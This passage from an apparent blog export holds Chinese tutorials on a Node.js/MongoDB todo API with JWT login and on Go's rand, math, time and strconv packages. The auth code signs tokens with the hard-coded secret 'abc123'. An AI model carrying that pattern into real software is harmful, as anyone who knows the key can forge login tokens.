&#125;);&#125;;UserSchema.statics.findByCredentials = function (email, password) &#123; var User = this; return User.findOne(&#123;email&#125;).then((user) =&gt; &#123; if (!user) &#123; return Promise.reject(); &#125; return new Promise((resolve, reject) =&gt; &#123; // Use bcrypt.compare to compare password and user.password bcrypt.compare(password, user.password, (err, res) =&gt; &#123; if (res) &#123; resolve(user); &#125; else &#123; reject(); &#125; &#125;); &#125;); &#125;);&#125;;//在保存之前执行操作。UserSchema.pre('save', function (next) &#123; var user = this;//保存时对于密码的更新 if (user.isModified('password')) &#123; bcrypt.genSalt(10, (err, salt) =&gt; &#123; //密码变为了hash bcrypt.hash(user.password, salt, (err, hash) =&gt; &#123; user.password = hash; next(); &#125;); &#125;); &#125; else &#123; next(); &#125;&#125;);var User = mongoose.model('User', UserSchema);//auth middlewirevar authenticate = (req, res, next) =&gt; &#123; var token = req.header('x-auth'); User.findByToken(token).then((user) =&gt; &#123; if (!user) &#123; return Promise.reject(); &#125; req.user = user; req.token = token; next(); &#125;).catch((e) =&gt; &#123; res.status(401).send(); &#125;);&#125;;app.delete('/users/me/token', authenticate, (req, res) =&gt; &#123; req.user.removeToken(req.token).then(() =&gt; &#123; res.status(200).send(); &#125;, () =&gt; &#123; res.status(400).send(); &#125;);&#125;);app.get('/users/me', authenticate, (req, res) =&gt; &#123; res.send(req.user);&#125;);// POST /users/login &#123;email, password&#125;app.post('/users/login', (req, res) =&gt; &#123; var body = _.pick(req.body, ['email', 'password']); User.findByCredentials(body.email, body.password).then((user) =&gt; &#123; return user.generateAuthToken().then((token) =&gt; &#123; res.header('x-auth', token).send(user); &#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;);// POST /usersapp.post('/users', (req, res) =&gt; &#123; var body = _.pick(req.body, ['email', 'password']); var user = new User(body); user.save().then(() =&gt; &#123; return user.generateAuthToken(); //调用方法，产生auth token并保存。 &#125;).then((token) =&gt; &#123; res.header('x-auth', token).send(user); //设置了响应头 &#125;).catch((e) =&gt; &#123; res.status(400).send(e); &#125;)&#125;);//express routeapp.post('/todos',authenticate,(req,res)=&gt;&#123;// console.log(req.body); //建立对象document var todo = new Todo(&#123; text:req.body.text, _creator:req.user._id &#125;); //保存 todo.save().then((doc)=&gt;&#123; res.send(doc); &#125;,(e)=&gt;&#123; res.status(400).send(e); &#125;);&#125;)//获取所有属性app.get('/todos', authenticate,(req, res) =&gt; &#123; Todo.find(&#123; _creator:req.user._id &#125;).then((todos) =&gt; &#123; res.send(&#123;todos&#125;); &#125;, (e) =&gt; &#123; res.status(400).send(e); &#125;)&#125;);//查询idapp.get('/todos/:id', authenticate,(req, res) =&gt; &#123; var id = req.params.id; if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; Todo.findOne(&#123; _id:id, _creator:req.user._id &#125;).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;);//删除app.delete('/todos/:id', authenticate,(req, res) =&gt; &#123; var id = req.params.id; if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; Todo.findOneAndRemove(&#123; _id: id, _creator: req.user._id &#125;).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;);//更新app.patch('/todos/:id',authenticate, (req, res) =&gt; &#123; var id = req.params.id; var body = _.pick(req.body, ['text', 'completed']); if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; if (_.isBoolean(body.completed) &amp;&amp; body.completed) &#123; body.completedAt = new Date().getTime(); &#125; else &#123; body.completed = false; body.completedAt = null; &#125; Todo.findOneAndUpdate(&#123;_id: id, _creator: req.user._id&#125;, &#123;$set: body&#125;, &#123;new: true&#125;).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;)&#125;);//监听app.listen(port,()=&gt;&#123; console.log(`Start on port $&#123;port&#125;`);&#125;);module.exports = &#123; app, Todo&#125;","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[31]-mongodb+express+middleware绑定用户权限2","slug":"node-31-bind-user-auth2","date":"2018-12-01T03:53:21.000Z","updated":"2018-12-01T10:23:24.009Z","comments":true,"path":"2018/12/01/node-31-bind-user-auth2/","link":"","permalink":"https://dreamerjonson.com/2018/12/01/node-31-bind-user-auth2/","excerpt":"","text":"继续绑定用户权限，要执行操作必须要有tokenvar mongoose = require('mongoose');var express = require('express');var bodyParser = require('body-parser');const &#123;ObjectID&#125; = require('mongodb');var _ = require('lodash');const validator = require('validator');const jwt = require('jsonwebtoken');const bcrypt = require('bcryptjs');//appvar app = express();const port = process.env.PORT || 3000;//express middleware Jonson对象与字符串转换。app.use(bodyParser.json());//mongoose.Promise = global.Promise;//连接mogodbmongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/TodoApp');//模版var Todo = mongoose.model('Todo',&#123; text:&#123; type:String, //类型 required:true, //必须要有 minlength:1, //最小长度 trim:true //去除空格 &#125;, completed:&#123; type:Boolean, default:false //默认值 &#125;, completedAt:&#123; type:Number, default:null &#125;, _creator: &#123; type: mongoose.Schema.Types.ObjectId, required: true &#125;&#125;);var UserSchema = new mongoose.Schema(&#123; email: &#123; type: String, required: true, trim: true, minlength: 1, unique: true, validate: &#123; validator: validator.isEmail, message: '&#123;VALUE&#125; is not a valid email' &#125; &#125;, password: &#123; type: String, require: true, minlength: 6 &#125;, tokens: [&#123; access: &#123; type: String, required: true &#125;, token: &#123; type: String, required: true &#125; &#125;]&#125;);UserSchema.methods.toJSON = function () &#123; var user = this; var userObject = user.toObject(); return _.pick(userObject, ['_id', 'email']);&#125;;UserSchema.methods.generateAuthToken = function () &#123; var user = this; var access = 'auth'; var token = jwt.sign(&#123;_id: user._id.toHexString(), access&#125;, 'abc123').toString(); user.tokens = user.tokens.concat([&#123;access,token&#125;]); return user.save().then(() =&gt; &#123; return token; //返回token &#125;);&#125;;UserSchema.methods.removeToken = function (token) &#123; var user = this; return user.update(&#123; $pull: &#123; tokens: &#123;token&#125; &#125; &#125;);&#125;;UserSchema.statics.findByToken = function (token) &#123; var User = this; var decoded; try &#123; decoded = jwt.verify(token, 'abc123'); &#125; catch (e) &#123; return Promise.reject(); &#125; return User.findOne(&#123; '_id': decoded._id, 'tokens.token': token, 'tokens.access': 'auth' &#125;);&#125;;UserSchema.statics.findByCredentials = function (email, password) &#123; var User = this; return User.findOne(&#123;email&#125;).then((user) =&gt; &#123; if (!user) &#123; return Promise.reject(); &#125; return new Promise((resolve, reject) =&gt; &#123; // Use bcrypt.compare to compare password and user.password bcrypt.compare(password, user.password, (err, res) =&gt; &#123; if (res) &#123; resolve(user); &#125; else &#123; reject(); &#125; &#125;); &#125;); &#125;);&#125;;//在保存之前执行操作。UserSchema.pre('save', function (next) &#123; var user = this;//保存时对于密码的更新 if (user.isModified('password')) &#123; bcrypt.genSalt(10, (err, salt) =&gt; &#123; //密码变为了hash bcrypt.hash(user.password, salt, (err, hash) =&gt; &#123; user.password = hash; next(); &#125;); &#125;); &#125; else &#123; next(); &#125;&#125;);var User = mongoose.model('User', UserSchema);//auth middlewirevar authenticate = (req, res, next) =&gt; &#123; var token = req.header('x-auth'); User.findByToken(token).then((user) =&gt; &#123; if (!user) &#123; return Promise.reject(); &#125; req.user = user; req.token = token; next(); &#125;).catch((e) =&gt; &#123; res.status(401).send(); &#125;);&#125;;app.delete('/users/me/token', authenticate, (req, res) =&gt; &#123; req.user.removeToken(req.token).then(() =&gt; &#123; res.status(200).send(); &#125;, () =&gt; &#123; res.status(400).send(); &#125;);&#125;);app.get('/users/me', authenticate, (req, res) =&gt; &#123; res.send(req.user);&#125;);// POST /users/login &#123;email, password&#125;app.post('/users/login', (req, res) =&gt; &#123; var body = _.pick(req.body, ['email', 'password']); User.findByCredentials(body.email, body.password).then((user) =&gt; &#123; return user.generateAuthToken().then((token) =&gt; &#123; res.header('x-auth', token).send(user); &#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;);// POST /usersapp.post('/users', (req, res) =&gt; &#123; var body = _.pick(req.body, ['email', 'password']); var user = new User(body); user.save().then(() =&gt; &#123; return user.generateAuthToken(); //调用方法，产生auth token并保存。 &#125;).then((token) =&gt; &#123; res.header('x-auth', token).send(user); //设置了响应头 &#125;).catch((e) =&gt; &#123; res.status(400).send(e); &#125;)&#125;);//express routeapp.post('/todos',authenticate,(req,res)=&gt;&#123;// console.log(req.body); //建立对象document var todo = new Todo(&#123; text:req.body.text, _creator:req.user._id &#125;); //保存 todo.save().then((doc)=&gt;&#123; res.send(doc); &#125;,(e)=&gt;&#123; res.status(400).send(e); &#125;);&#125;)//获取所有属性app.get('/todos', authenticate,(req, res) =&gt; &#123; Todo.find(&#123; _creator:req.user._id &#125;).then((todos) =&gt; &#123; res.send(&#123;todos&#125;); &#125;, (e) =&gt; &#123; res.status(400).send(e); &#125;)&#125;);//查询idapp.get('/todos/:id', authenticate,(req, res) =&gt; &#123; var id = req.params.id; if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; Todo.findOne(&#123; _id:id, _creator:req.user._id &#125;).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;);//删除app.delete('/todos/:id', authenticate,(req, res) =&gt; &#123; var id = req.params.id; if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; Todo.findOneAndRemove(&#123; _id: id, _creator: req.user._id &#125;).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;);//更新app.patch('/todos/:id',authenticate, (req, res) =&gt; &#123; var id = req.params.id; var body = _.pick(req.body, ['text', 'completed']); if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; if (_.isBoolean(body.completed) &amp;&amp; body.completed) &#123; body.completedAt = new Date().getTime(); &#125; else &#123; body.completed = false; body.completedAt = null; &#125; Todo.findOneAndUpdate(&#123;_id: id, _creator: req.user._id&#125;, &#123;$set: body&#125;, &#123;new: true&#125;).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;)&#125;);//监听app.listen(port,()=&gt;&#123; console.log(`Start on port $&#123;port&#125;`);&#125;);module.exports = &#123; app, Todo&#125; 测试 12345678910111213141516171819202122232425262728293031323334353637381、打开mongoDB &gt; ./mongod -dbpath /Users/jackson/Downloads/mongodb-data2、运行 &gt;node postman.js3、打开postman 选择post 输入 &gt;localhost:3000/users 保存userBody中填入：&#123; &quot;email&quot;: &quot;zhuimengshaonian08@gmail.com&quot;, &quot;password&quot; : &quot;123abc!&quot;&#125;返回：&#123; &quot;_id&quot;: &quot;5c00a66978dd038d39dc4b89&quot;, &quot;email&quot;: &quot;zhuimengshaonian08@gmail.com&quot;&#125;header:x-auth →eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI1YmZlNzE2NTkxZTc4YzZhNGFkOGMxNjQiLCJhY2Nlc3MiOiJhdXRoIiwiaWF0IjoxNTQzNDAxODI5fQ.wOKNzkls_w_jA5YVkCo0r9gFZ4-KtD6GarRiCDpAPr84、 选择patch 输入 &gt;localhost:3000/todos/5c00a66978dd038d39dc4b89 准备修改Body中填入：&#123; &quot;text&quot;: &quot;zhuimengshaonian09@gmail.com&quot;,&#125;header附带返回：x-auth →eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI1YmZlNzE2NTkxZTc4YzZhNGFkOGMxNjQiLCJhY2Nlc3MiOiJhdXRoIiwiaWF0IjoxNTQzNDAxODI5fQ.wOKNzkls_w_jA5YVkCo0r9gFZ4-KtD6GarRiCDpAPr8返回：&#123; &quot;completed&quot;: false, &quot;completedAt&quot;: null, &quot;_id&quot;: &quot;5c00a66978dd038d39dc4b89&quot;, &quot;text&quot;: &quot;zhuimengshaonian09@gmail.com&quot;, &quot;_creator&quot;: &quot;5c00a58c78dd038d39dc4b87&quot;, &quot;__v&quot;: 0&#125;","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"golang语言渐入佳境[30]-rand-package","slug":"golang-30-rand-package","date":"2018-12-01T03:38:29.000Z","updated":"2018-12-01T08:20:24.685Z","comments":true,"path":"2018/12/01/golang-30-rand-package/","link":"","permalink":"https://dreamerjonson.com/2018/12/01/golang-30-rand-package/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566package mainimport ( \"fmt\" \"math/rand\" \"time\")func main() &#123; randTest() randAnswer()&#125;func randTest() &#123; //1、通过默认的随机数种子获取随机数. //系统默认的rand对象，随机种子默认都是1 fmt.Println(rand.Int()) fmt.Println(rand.Intn(50)) fmt.Println(rand.Float64()) // 2、动态随机种子，生成随机资源，实例化成随机对象，通过随机对象获取随机数 s1 := rand.NewSource(time.Now().UnixNano()) r1 := rand.New(s1) randnum := r1.Intn(10) fmt.Println(randnum) //3、简写形式：动态种子来获取随机数 // [0,10] rand.Seed(time.Now().UnixNano()) fmt.Println(rand.Intn(10)) fmt.Println(rand.Float64()) //[5,11] num := rand.Intn(7) + 5 fmt.Println(num)&#125;func randAnswer() &#123; answers := []string&#123; \"It is certain\", \"It is decidedly so\", \"Without a doubt\", \"Yes definitely\", \"You may rely on it\", \"As I see it yes\", \"Most likely\", \"Outlook good\", \"Yes\", \"Signs point to yes\", \"Reply hazy try again\", \"Ask again later\", \"Better not tell you now\", \"Cannot predict now\", \"Concentrate and ask again\", \"Don't count on it\", \"My reply is no\", \"My sources say no\", \"Outlook not so good\", \"Very doubtful\", &#125; rand.Seed(time.Now().UnixNano()) randnum := rand.Intn(len(answers)) fmt.Println(\"随机回答\", answers[randnum])&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang语言渐入佳境[29]-math包核心方法","slug":"golang-29-math-package","date":"2018-12-01T03:34:41.000Z","updated":"2018-12-01T08:20:19.147Z","comments":true,"path":"2018/12/01/golang-29-math-package/","link":"","permalink":"https://dreamerjonson.com/2018/12/01/golang-29-math-package/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586package mainimport ( \"fmt\" \"math\")/*1、func IsNaN(f float64) (is bool) ● 报告f是否表示一个NaN（Not A Number）值。2、func Ceil(x float64) float64 ● 返回不小于x的最小整数（的浮点值）3、func Floor(x float64) float64 ● 返回不大于x的最小整数（的浮点值）4、func Trunc(x float64) float64 ● 返回x的整数部分（的浮点值）。5、func Abs(x float64) float64 ● 返回x的绝对值6、func Max(x, y float64) float64 ● 返回x和y中最大值7、func Min(x, y float64) float64 ● 返回x和y中最小值8、func Dim(x, y float64) float64 ● 函数返回x-y和0中的最大值9、func Mod(x, y float64) float64 ● 取余运算，可以理解为 x-Trunc(x/y)*y，结果的正负号和x相同10、func Sqrt(x float64) float64 ● 返回x的二次方根11、func Cbrt(x float64) float64 ● 返回x的三次方根，特例如下：12、func Hypot(p, q float64) float64 ● 返回Sqrt(p*p + q*q)13、func Pow(x, y float64) float64 ● 返回x^y14、func Sin(x float64) float64 ● 求正弦。15、func Cos(x float64) float64 ● 求余弦。16、func Tan(x float64) float64 ● 求正切。17、func Log(x float64) float64 ● 求自然对数18、func Log2(x float64) float64 ● 求2为底的对数。19、func Log10(x float64) float64求10为底的对数。 */func main() &#123; fmt.Println(math.IsNaN(3.4)) //false fmt.Println(math.Ceil(1.000001)) //2 fmt.Println(math.Floor(1.999999)) //1 fmt.Println(math.Trunc(1.999999)) //1 fmt.Println(math.Abs(-1.3)) //1.3 fmt.Println(math.Max(-1.3, 0)) //0 fmt.Println(math.Min(-1.3, 0)) //-1.3 fmt.Println(math.Dim(-12, -19)) //7 fmt.Println(math.Dim(-12, 19)) //0 fmt.Println(math.Mod(9, 4)) //1 fmt.Println(math.Sqrt(9)) //3 fmt.Println(math.Cbrt(8)) //2 fmt.Println(math.Hypot(3, 4)) //5 fmt.Println(math.Pow(2, 8)) //256 fmt.Println(math.Log(1)) //0 fmt.Println(math.Log2(16)) //4 fmt.Println(math.Log10(1000)) //3&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang语言渐入佳境[28]-time包核心方法","slug":"golang-28-time-package","date":"2018-12-01T03:30:33.000Z","updated":"2018-12-01T08:20:15.449Z","comments":true,"path":"2018/12/01/golang-28-time-package/","link":"","permalink":"https://dreamerjonson.com/2018/12/01/golang-28-time-package/","excerpt":"","text":"time包核心方法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181package mainimport ( \"time\" \"fmt\")/*//1、Now()返回当前本地时间//2、Local()将时间转成本地时区，但指向同一时间点的Time。//3、UTC()将时间转成UTC和零时区，但指向同一时间点的Time。//4、Date()可以根据指定数值，返回一个本地或国际标准的时间格式。//5、Parse()能将一个格式化的时间字符串解析成它所代表的时间。就是string转time//6、Format()根据指定的时间格式，将时间格式化成文本。就是time转string//7、String()将时间格式化成字符串，格式为：\"2006-01-02 15:04:05.999999999 -0700 MST\"//8、Unix()将t表示为Unix时间（时间戳，一个int64整数），即从时间点January 1, 1970 UTC到时间点t所经过的时间（单位秒）。//9、UnixNano()将t表示为Unix时间（时间戳，一个int64整数），即从时间点January 1, 1970 UTC到时间点t所经过的时间（单位纳秒）。//10、Equal()判断时间是否相等//11、Before()如果t代表的时间点在u之前，返回真；否则返回假。//12、After()如果t代表的时间点在u之后，返回真；否则返回假。//13、Date()返回时间点对应的年、月、日信息//14、Year()返回时间点对应的年的信息//15、Month()返回时间点对应的月的信息//16、Day()返回时间点对应的日的信息//17、Weekday()返回时间点对应的星期的信息//18、Clock()返回时间点对应的时、分、秒信息//19、Hour()返回时间点对应的小时的信息//20、Minute()返回时间点对应的分的信息//21、Second()返回时间点对应的秒的信息//22、Nanosecond()返回时间点对应的纳秒的信息//23、Sub()返回一个时间段t-u。//24、Hours()将时间段表示为float64类型的小时数。//25、Minutes()将时间段表示为float64类型的分钟数。//26、Seconds()将时间段表示为float64类型的秒数。//27、Nanoseconds()将时间段表示为int64类型的纳秒数，等价于int64(d)。//28、String()返回时间段采用\"72h3m0.5s\"格式的字符串表示。//29、ParseDuration解析一个时间段字符串。//30、Add()返回时间点t+d。//31、AddDate()返回增加了给出的年份、月份和天数的时间点Time。 */func main() &#123; time1 := time.Now() testTime() time2 := time.Now() //计算函数执行时间 fmt.Println(time2.Sub(time1).Seconds())&#125;func testTime() &#123; //1、Now()返回当前本地时间 t := time.Now() fmt.Println(\"1、\", t) //2、Local()将时间转成本地时区，但指向同一时间点的Time。 fmt.Println(\"2、\", t.Local()) //3、UTC()将时间转成UTC和零时区，但指向同一时间点的Time。 fmt.Println(\"3、\", t.UTC()) //4、Date()可以根据指定数值，返回一个本地或国际标准的时间格式。 t = time.Date(2018, time.January, 1, 1, 1, 1, 0, time.Local) fmt.Printf(\"4、本地时间%s ， 国际统一时间：%s \\n\", t, t.UTC()) //5、Parse()能将一个格式化的时间字符串解析成它所代表的时间。就是string转time //预定义的ANSIC、UnixDate、RFC3339 //ANSIC = \"Mon Jan _2 15:04:05 2006\"//1 1 2 3 4 5 6 t, _ = time.Parse(\"2006-01-02 15:04:05\", \"2018-07-19 05:47:13\") fmt.Println(\"5、\", t) //6、Format()根据指定的时间格式，将时间格式化成文本。就是time转string fmt.Println(\"6、\" , time.Now().Format(\"2006-01-02 15:04:05\")) //7、String()将时间格式化成字符串，格式为：\"2006-01-02 15:04:05.999999999 -0700 MST\" fmt.Println(\"7、\" , time.Now().String()) //8、Unix()将t表示为Unix时间（时间戳，一个int64整数），即从时间点January 1, 1970 UTC到时间点t所经过的时间（单位秒）。 fmt.Println(\"8、\" , time.Now().Unix()) //9、UnixNano()将t表示为Unix时间（时间戳，一个int64整数），即从时间点January 1, 1970 UTC到时间点t所经过的时间（单位纳秒）。 fmt.Println(\"9、\" , time.Now().UnixNano()) //10、Equal()判断时间是否相等 fmt.Println(\"10、\" , t.Equal(time.Now())) //11、Before()如果t代表的时间点在u之前，返回真；否则返回假。 fmt.Println(\"11、\" , t.Before(time.Now())) //12、After()如果t代表的时间点在u之后，返回真；否则返回假。 fmt.Println(\"12、\" , t.After(time.Now())) //13、Date()返回时间点对应的年、月、日信息 year , month , day := time.Now().Date() fmt.Println(\"13、\" , year , month ,day) //14、Year()返回时间点对应的年的信息 fmt.Println(\"14、\" , time.Now().Year()) //15、Month()返回时间点对应的月的信息 fmt.Println(\"15、\" , time.Now().Month()) //16、Day()返回时间点对应的日的信息 fmt.Println(\"16、\" , time.Now().Day()) //17、Weekday()返回时间点对应的星期的信息 fmt.Println(\"17、\" , time.Now().Weekday()) //18、Clock()返回时间点对应的时、分、秒信息 hour , minute , second := time.Now().Clock() fmt.Println(\"18、\" , hour , minute , second) //19、Hour()返回时间点对应的小时的信息 fmt.Println(\"19、\" , time.Now().Hour()) //20、Minute()返回时间点对应的分的信息 fmt.Println(\"20、\" , time.Now().Minute()) //21、Second()返回时间点对应的秒的信息 fmt.Println(\"21、\" , time.Now().Second()) //22、Nanosecond()返回时间点对应的纳秒的信息 fmt.Println(\"22、\" , time.Now().Nanosecond()) //23、Sub()返回一个时间段t-u。 fmt.Println(\"23、\" , time.Now().Sub(time.Now())) //24、Hours()将时间段表示为float64类型的小时数。 fmt.Println(\"24、\" , time.Now().Sub(time.Now()).Hours()) //25、Minutes()将时间段表示为float64类型的分钟数。 fmt.Println(\"25、\" , time.Now().Sub(time.Now()).Minutes()) //26、Seconds()将时间段表示为float64类型的秒数。 fmt.Println(\"26、\" , time.Now().Sub(time.Now()).Seconds()) //27、Nanoseconds()将时间段表示为int64类型的纳秒数，等价于int64(d)。 fmt.Println(\"27、\" , time.Now().Sub(time.Now()).Nanoseconds()) //28、String()返回时间段采用\"72h3m0.5s\"格式的字符串表示。 fmt.Println(\"28、\" , \"时间间距：\", t.Sub(time.Now()).String()) //29、ParseDuration解析一个时间段字符串。 d,_:=time.ParseDuration(\"1h30m\") fmt.Println(\"29、\" , d) //30、Add()返回时间点t+d。 fmt.Println(\"30、\" , \"交卷时间：\" , time.Now().Add(d)) //31、AddDate()返回增加了给出的年份、月份和天数的时间点Time。 fmt.Println(\"31、\" , \"一年一个月零一天之后的日期：\" , time.Now().AddDate(1,1,1))&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang语言渐入佳境[27]-其他类型转string函数","slug":"golang-27-string-package6","date":"2018-11-30T09:34:51.000Z","updated":"2018-11-30T10:07:38.629Z","comments":true,"path":"2018/11/30/golang-27-string-package6/","link":"","permalink":"https://dreamerjonson.com/2018/11/30/golang-27-string-package6/","excerpt":"","text":"其他类型转string函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071package mainimport ( \"fmt\" \"strconv\")/*1、func Itoa(i int) stringItoa 是 FormatInt(int64(i), 10) 的缩写。2、func FormatInt(i int64, base int) stringFormatInt 返回给定基数中的i的字符串表示，对于2 &lt;= base &lt;= 36.结果对于数字值&gt; = 10使用小写字母 'a' 到 'z' 。3、func FormatUint(i uint64, base int) stringFormatUint 返回给定基数中的 i 的字符串表示，对于2 &lt;= base &lt;= 36.结果对于数字值&gt; = 10使用小写字母 'a' 到 'z' 。4、func FormatFloat(f float64, fmt byte, prec, bitSize int) stringFormatFloat 根据格式 fmt 和 precision prec 将浮点数f转换为字符串。它将结果进行四舍五入，假设原始数据是从 bitSize 位的浮点值获得的（float32为32，float64为64）。格式 fmt 是 'b'，'e'，'E'，'f'，'g'或 'G'。5、func FormatBool(b bool) stringFormatBool 根据 b 的值返回“true”或“false” */func main() &#123; TestItoa() TestFormatInt() TestFormatUint() TestFormatFloat() TestFormatBool()&#125;func TestItoa() &#123; s := strconv.Itoa(199) fmt.Printf(\"%T , %v , 长度：%d \\n\", s, s, len(s)) fmt.Println(\"----------------\")&#125;func TestFormatInt() &#123; s := strconv.FormatInt(-19968, 16)//4e00 s = strconv.FormatInt(-40869, 16)//9fa5 fmt.Printf(\"%T , %v , 长度：%d \\n\", s, s, len(s)) fmt.Println(\"----------------\")&#125;func TestFormatUint() &#123; s := strconv.FormatUint(19968, 16)//4e00 s = strconv.FormatUint(40869, 16)//9fa5 fmt.Printf(\"%T , %v , 长度：%d \\n\", s, s, len(s)) fmt.Println(\"----------------\")&#125;func TestFormatFloat() &#123; s := strconv.FormatFloat(3.1415926 , 'g' , -1 , 64) fmt.Printf(\"%T , %v , 长度：%d \\n\", s, s, len(s)) fmt.Println(\"----------------\")&#125;func TestFormatBool() &#123; s := strconv.FormatBool(true) s = strconv.FormatBool(false) fmt.Printf(\"%T , %v , 长度：%d \\n\", s, s, len(s)) fmt.Println(\"----------------\")&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang语言渐入佳境[26]-string转其他类型函数","slug":"golang-26-string-package5","date":"2018-11-30T09:31:34.000Z","updated":"2018-11-30T09:38:53.615Z","comments":true,"path":"2018/11/30/golang-26-string-package5/","link":"","permalink":"https://dreamerjonson.com/2018/11/30/golang-26-string-package5/","excerpt":"","text":"string转其他类型函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788package mainimport ( \"strconv\" \"fmt\")/*1、func Atoi(s string) (int, error)Atoi 返回 ParseInt(s, 10, 0) 转换为 int 类型的结果。【alphabet：字母】2、func ParseInt(s string, base int, bitSize int) (i int64, err error)ParseInt 解释给定基础（2到36）中的字符串 s 并返回相应的值 i。如果 base == 0，则基数由字符串的前缀隐含：base 16代表“0x”，base 8代表“0”，否则以10为底数。3、func ParseUint(s string, base int, bitSize int) (uint64, error)ParseUint 就像 ParseInt，但是对于无符号数字。4、func ParseFloat(s string, bitSize int) (float64, error)ParseFloat 将字符串 s 转换为浮点数，精度由 bitSize：32指定，float32为64; float64为64。当 bitSize = 32时，结果仍然具有 float64 类型，但可以在不更改其值的情况下将其转换为 float32。5、func ParseBool(str string) (bool, error)ParseBool 返回字符串表示的布尔值。它接受1，t，T，TRUE，true，True，0，f，F，FALSE，false，False。任何其他值都会返回错误。 */func main() &#123; TestAtoi() TestParseInt() TestParseUint() TestParseFloat() TestParseBool()&#125;func TestAtoi() &#123; a, _ := strconv.Atoi(\"100\") fmt.Printf(\"%T , %v \\n\", a, a+2) fmt.Println(\"---------------\")&#125;func TestParseInt() &#123; num, _ := strconv.ParseInt(\"-4e00\", 16, 64) fmt.Printf(\"%T , %v \\n\", num, num) num, _ = strconv.ParseInt(\"01100001\", 2, 64) fmt.Printf(\"%T , %v\\n\", num, num) num, _ = strconv.ParseInt(\"-01100001\", 10, 64) fmt.Printf(\"%T , %v\\n\", num, num) num, _ = strconv.ParseInt(\"4e00\", 10, 64) fmt.Printf(\"%T , %v\\n\", num, num) fmt.Println(\"---------------\")&#125;func TestParseUint() &#123; num, _ := strconv.ParseUint(\"4e00\", 16, 64) fmt.Printf(\"%T , %v \\n\", num, num) num, _ = strconv.ParseUint(\"01100001\", 2, 64) fmt.Printf(\"%T , %v\\n\", num, num) num, _ = strconv.ParseUint(\"-1100001\", 10, 64) fmt.Printf(\"%T , %v\\n\", num, num) num, _ = strconv.ParseUint(\"4e00\", 10, 64) fmt.Printf(\"%T , %v\\n\", num, num) fmt.Println(\"---------------\")&#125;func TestParseFloat() &#123; pi := \"3.1415926\" num , _ := strconv.ParseFloat(pi , 64) fmt.Printf(\"%T , %v\\n\", num, num*2) fmt.Println(\"---------------\")&#125;func TestParseBool() &#123; //1, t, T, TRUE, true, True, // 0, f, F, FALSE, false, False. flag , _:=strconv.ParseBool(\"steven\") fmt.Printf(\"%T , %v\\n\", flag, flag) fmt.Println(\"---------------\")&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang语言渐入佳境[25]-string-trim修剪类函数","slug":"golang-25-string-package4","date":"2018-11-30T09:29:19.000Z","updated":"2018-11-30T09:38:49.773Z","comments":true,"path":"2018/11/30/golang-25-string-package4/","link":"","permalink":"https://dreamerjonson.com/2018/11/30/golang-25-string-package4/","excerpt":"","text":"string-trim修剪类函数 